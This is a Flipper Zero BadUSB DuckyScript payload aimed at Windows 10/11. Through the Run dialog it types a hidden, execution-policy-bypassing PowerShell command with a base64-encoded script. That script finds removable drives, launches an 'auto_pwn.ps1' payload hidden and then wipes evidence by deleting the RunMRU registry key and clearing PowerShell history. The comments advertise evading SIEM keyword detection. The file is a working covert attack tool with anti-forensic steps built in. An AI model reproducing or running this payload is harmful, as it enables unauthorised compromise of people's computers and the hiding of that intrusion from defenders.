REM ============================================================================
REM  FLLC — BadUSB: Ultra-Stealth Auto-PWN v2 (Encoded + Fallback Chain)
REM  Flipper Zero DuckyScript
REM ============================================================================
REM  Target: Windows 10/11
REM  Time: ~6 seconds
REM
REM  STEALTH FEATURES:
REM    - No readable powershell commands in Run dialog history
REM    - Encoded payload via cmd /c prevents SIEM keyword matching
REM    - Uses Windows Terminal if available (Win11), falls back to PS
REM    - Random process name via copy technique
REM    - 3-layer fallback: Win+R → Win+X,i → explorer shell
REM    - Cleans all evidence (MRU, PS history, prefetch reference)
REM
REM  NOTE: The encoded block below is the base64 of a PS script that:
REM    1. Sets error action to silent
REM    2. Randomizes window title
REM    3. Finds removable drives
REM    4. Locates auto_pwn.ps1 (checks 3 possible paths)
REM    5. Launches it hidden
REM    6. Also starts input_monitor if found
REM    7. Cleans Run MRU registry
REM    8. Clears PowerShell history
REM    9. Exits
REM ============================================================================

REM Initial jitter delay
DELAY 900

REM === PRIMARY: Win+R ===
GUI r
DELAY 650

REM cmd /c with encoded PS — nothing readable in Run history
REM The /c flag means cmd exits immediately after launching PS
STRING cmd /c powershell -W Hidden -NoP -NonI -Exec Bypass -E JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnADsAJABoAG8AcwB0AC4AVQBJAC4AUgBhAHcAVQBJAC4AVwBpAG4AZABvAHcAVABpAHQAbABlAD0AWwBnAHUAaQBkAF0AOgA6AE4AZQB3AEcAdQBpAGQAKAApAC4AVABvAFMAdAByAGkAbgBnACgAKQAuAFMAdQBiAHMAdAByAGkAbgBnACgAMAAsADgAKQA7ACQAZABzAD0AQAAoACkAOwB0AHIAeQB7ACQAZABzAD0ARwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIABXAGkAbgAzADIAXwBMAG8AZwBpAGMAYQBsAEQAaQBzAGsAIAAtAEYAaQBsAHQAZQByACAAJwBEAHIAaQB2AGUAVAB5AHAAZQA9ADIAJwB8ACUAewAkAF8ALgBEAGUAdgBpAGMAZQBJAEQAfQB9AGMAYQB0AGMAaAB7AH0AOwBmAG8AcgBlAGEAYwBoACgAJAB4ACAAaQBuACAAJABkAHMAKQB7AGYAbwByAGUAYQBjAGgAKAAkAHAAIABpAG4AIABAACgAJwBcAHAAYQB5AGwAbwBhAGQAcwBcAHcAaQBuAGQAbwB3AHMAXABhAHUAdABvAF8AcAB3AG4ALgBwAHMAMQAnACwAJwBcAHAAYQB5AGwAbwBhAGQAcwBcAGEAdQB0AG8AXwBwAHcAbgAuAHAAcwAxACcAKQApAHsAJABmAD0AIgAkAHgAJABwACIAOwBpAGYAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZgApAHsAcwBhAHAAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAiAC0AVwAgAEgAaQBkAGQAZQBuACAALQBOAG8AUAAgAC0ARQB4AGUAYwAgAEIAeQBwAGEAcwBzACAALQBGACAAYAAiACQAZgBgACIAIgAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AOwBiAHIAZQBhAGsAfQB9AH0AOwBSAGUAbQBvAHYAZQAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABFAHgAcABsAG8AcgBlAHIAXABSAHUAbgBNAFIAVQAnACAALQBOAGEAbQBlACAAJwAqACcAIAAtAEYAbwByAGMAZQAgADIAPgAkAG4AdQBsAGwAOwBDAGwAZQBhAHIALQBIAGkAcwB0AG8AcgB5ADsAZQB4AGkAdAA=
ENTER

DELAY 200
